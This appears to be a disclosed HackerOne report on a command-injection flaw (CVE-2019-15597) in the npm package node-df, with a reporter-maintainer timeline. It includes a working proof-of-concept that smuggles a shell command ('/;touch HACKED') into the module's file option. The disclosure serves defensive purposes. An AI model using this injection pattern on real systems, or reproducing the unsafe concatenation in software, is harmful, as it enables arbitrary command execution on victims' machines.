---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - stack/node
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2019-12-04
submitted: 2019-09-28T09:11:41.085Z
bounty_usd: null
votes: 5
cve: "CVE-2019-15597"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "mik317"
source: "https://hackerone.com/reports/703412"
title: "[node-df] RCE via insecure command concatenation"
---
# [node-df] RCE via insecure command concatenation

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2019-12-04

- Report: [https://hackerone.com/reports/703412](https://hackerone.com/reports/703412)
- CWE: Code Injection | CVE: CVE-2019-15597
- Submitted: 2019-09-28T09:11:41.085Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `RCE` issue in the `node-df` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `node-df`
**version:** `0.1.4`
**npm page:** `https://www.npmjs.com/package/node-df`

## Module Description
> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.

## Module Stats
[N/A] downloads in the last day
[3,023] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: 

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```
1. Execute the following commands in terminal:

```bash
npm i node-df # Install affected module
ls # Make sure there isn't any *HACKED* file
node poc.js #  Run the PoC
ls # The *HACKED* file has been created
```
1. The `HACKED` file will be created {F594172}

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `node-df` via `insecure command concatenation`

## Timeline

- **Report Filed**
- **2019-09-28** @mik317: PS: THe issue arises in the following code-line: https://github.com/adriano-di-giovanni/node-df/blob/master/lib/index.js#L36

Best, Mik
- **2019-09-29** @nochnoidozor: Hi @mik317,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Severity Updated**
- **Report Triaged**
- **2019-10-07** @lirantal: thanks for the report @mik317, I invited the package maintainer to review this
- **2019-10-08** @mik317: Thank you :)

Best, Mik
- **2019-12-04** @lirantal: Will disclose due to no reply from maintainer
- **Changed Scope**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **External User Joined**
